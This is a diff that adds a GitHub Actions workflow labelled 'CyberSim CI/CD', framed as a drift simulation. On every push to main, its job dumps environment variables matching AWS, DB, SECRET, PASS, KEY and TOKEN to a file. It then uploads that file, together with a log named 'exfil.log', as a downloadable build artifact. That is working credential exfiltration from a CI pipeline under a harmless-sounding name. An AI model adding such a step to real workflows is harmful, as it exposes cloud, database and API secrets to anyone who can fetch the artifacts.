@@ -1,0 +1,17 @@
+name: CyberSim CI/CD
+on:
+  push:
+    branches: [ main ]
+
+jobs:
+  drift-sim:
+    runs-on: ubuntu-latest
+    steps:
+      - run: env | grep -E 'AWS|DB|SECRET|PASS|KEY|TOKEN' > /tmp/secrets.env
+      - run: echo "CI/CD Drift Simulation OK" >> /tmp/exfil.log
+      - uses: actions/upload-artifact@v4
+        with:
+          name: cyber-evidence
+          path: |
+            /tmp/secrets.env
+            /tmp/exfil.log
